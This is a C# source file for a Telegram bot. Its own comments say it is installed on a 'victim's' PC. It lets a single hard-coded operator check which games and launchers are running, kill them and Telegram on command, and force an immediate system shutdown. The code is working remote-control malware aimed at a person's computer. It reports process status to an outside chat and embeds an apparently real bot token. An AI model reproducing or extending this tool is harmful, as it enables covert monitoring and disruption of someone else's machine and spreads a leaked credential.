using System.Diagnostics;
using Telegram.Bot;
using Telegram.Bot.Polling;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;

// cose da fare sul pc della vittima:
// 1- Clonare la repo di git
// 2- scaricare .NET 8 RunTime per console app --> https://builds.dotnet.microsoft.com/dotnet/Runtime/8.0.19/dotnet-runtime-8.0.19-win-x64.exe

// per chiudere WatchdogBot si può usare il Task Manager -->
// usa "ctrl + shift + esc" per aprire il Task Manager, clicca su dettagli, cerca "WatchdogBot.exe" e termina il processo


internal class Program
{
    static string green = "✅";
    static string red = "❌";

    static string BotToken = "8431732585:AAGFBe6UFrILdXMNtV9vZvmcq03rZ6UT4Xo"; // Token del bot
    static long PippoId = 6341619196;  // Telegram user ID

    static ITelegramBotClient botClient = new TelegramBotClient(BotToken);

    static async Task Main()
    {
        Console.WriteLine("Bot avviato. Attendere...");

        var cts = new CancellationTokenSource();

        var receiverOptions = new ReceiverOptions
        {
            AllowedUpdates = null // ricevi tutti gli aggiornamenti
        };

        botClient.StartReceiving(
            HandleUpdateAsync,
            HandleErrorAsync,
            receiverOptions,
            cancellationToken: cts.Token
        );

        var me = await botClient.GetMeAsync();
        Console.WriteLine($"Bot connesso come {me.Username}");

        await Task.Delay(-1);
    }

    static async Task HandleUpdateAsync(ITelegramBotClient bot, Update update, CancellationToken cancellationToken)
    {
        if (update.Message is not { Type: MessageType.Text } message)
            return;

        var text = message.Text!.ToUpperInvariant().Trim();
        var chatId = message.Chat.Id;
        Console.WriteLine($"Testo ricevuto: '{text}'");
        await bot.SendTextMessageAsync(chatId, $"Testo ricevuto: '{text}'");

        if (chatId != PippoId)
        {
            await bot.SendTextMessageAsync(chatId, "WHO ARE YOU?! I WILL TELL MY MASTER");
            await bot.SendTextMessageAsync(PippoId, $"Someone contacted me! Text: {message.Text}");
            return;
        }

        switch (text)
        {
            case "/START":
                var keyboard = new ReplyKeyboardMarkup(new[]
{
    new KeyboardButton[] { new KeyboardButton("KA") },
    new KeyboardButton[] { new KeyboardButton("U") },
    new KeyboardButton[] { new KeyboardButton("K FG") },
    new KeyboardButton[] { new KeyboardButton("K MW") },
    //new KeyboardButton[] { new KeyboardButton("KONEM") },//si può sostituire
    //new KeyboardButton[] { new KeyboardButton("KTENS") },//si può sostituire
    new KeyboardButton[] { new KeyboardButton("SD") },
})
                {
                    ResizeKeyboard = true
                };

                await bot.SendTextMessageAsync(chatId, "Welcome back Master", replyMarkup: keyboard);
                break;

            case "KA":
                KillAll();
                await bot.SendTextMessageAsync(chatId, "Killing All");
                break;

            case "K FG":
                KillTelegram();
                KillFallGuys();
                KillEpicGames();
                await bot.SendTextMessageAsync(chatId, "Killing Fall Guys");
                break;

            case "U":
                await UpdateUser();
                break;

            case "SD":
                await bot.SendTextMessageAsync(chatId, "Shutting down. Bye Bye");
                ShutdownPc();
                break;

            case "K MW":
                KillTelegram();
                KillMakeWay();
                KillEpicGames();
                await bot.SendTextMessageAsync(chatId, "Killing Make Way");
                break;

            //case "KONEM"://si può sostituire
            // await Task.Delay(60000);
            // KillAll();
            // await bot.SendTextMessageAsync(chatId, ".");
            // break;

            //case "KTENS"://si può sostituire
            // await Task.Delay(10000);
            // KillAll();
            // await bot.SendTextMessageAsync(chatId, ".");
            // break;

            default:
                await bot.SendTextMessageAsync(chatId, "I don't understand...");
                break;
        }
    }

    static Task HandleErrorAsync(ITelegramBotClient bot, Exception exception, CancellationToken cancellationToken)
    {
        Console.WriteLine($"Errore: {exception.Message}");
        return Task.CompletedTask;
    }

    static async Task UpdateUser()
    {
        KillTelegram();
        await SendStatus("EG", "EpicGamesLauncher");
        await SendStatus("F", "FallGuys_client_game");
        await SendStatus("MW", "Make Way");
        //await SendStatus("R", "RainbowSix");//si può sostituire
    }

    static async Task SendStatus(string prefix, string processName)
    {
        bool running = IsProcessRunning(processName);
        string status = running ? green : red;
        await botClient.SendTextMessageAsync(PippoId, prefix + status);
    }

    static bool IsProcessRunning(string name)
    {
        return Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name)).Any();
    }

    static void KillProcess(string name)
    {
        foreach (var proc in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(name)))
        {
            try { proc.Kill(); } catch { }
        }
    }

    static void KillFallGuys() => KillProcess("FallGuys_client_game");
    static void KillEpicGames() => KillProcess("EpicGamesLauncher");
    static void KillTelegram() => KillProcess("Telegram");
    static void KillMakeWay() => KillProcess("Make Way");
    static void KillRainbow6Siege() => KillProcess("RainbowSix");//si può sostituire

    static void KillAll()
    {
        KillFallGuys();
        KillEpicGames();
        KillTelegram();
        KillMakeWay();
        //KillRainbow6Siege();KillMakeWay
    }

    static void ShutdownPc()
    {
        var psi = new ProcessStartInfo("shutdown", "/s /t 0")
        {
            CreateNoWindow = true,
            UseShellExecute = false
        };
        Process.Start(psi);
    }
}